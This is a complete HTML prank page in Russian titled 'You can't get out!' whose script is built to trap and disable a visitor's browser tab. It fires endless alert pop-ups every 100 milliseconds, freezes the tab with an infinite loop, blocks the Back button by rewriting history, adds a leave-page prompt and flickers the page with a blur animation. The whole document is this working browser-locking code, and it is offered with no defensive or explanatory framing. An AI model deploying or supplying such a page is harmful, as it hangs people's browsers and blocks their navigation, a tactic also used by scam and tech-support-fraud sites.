<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Никуда не выйдешь!</title>
    <style>
        body {
            animation: lag 0.1s infinite;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 20%;
        }
        @keyframes lag {
            from { filter: blur(0px); }
            to { filter: blur(100px); }
        }
    </style>
</head>
<body>
    <h1>Вы не можете покинуть этот сайт!</h1>

    <script>
        // Бесконечные алерты
        function alertLoop() {
            setTimeout(() => {
                alert("Вы не можете уйти!");
                alertLoop();
            }, 100);
        }
        alertLoop();

        // Остановка работы вкладки (бесконечный цикл)
        function freezeBrowser() {
            while (true) {
                console.log(Math.random());
            }
        }
        setTimeout(freezeBrowser, 500);

        // Блокировка кнопки "Назад"
        history.pushState(null, "", location.href);
        window.onpopstate = function () {
            history.pushState(null, "", location.href);
        };

        // Предупреждение при закрытии вкладки
        window.onbeforeunload = function() {
            return "Вы точно хотите уйти?";
        };
    </script>
</body>
</html>
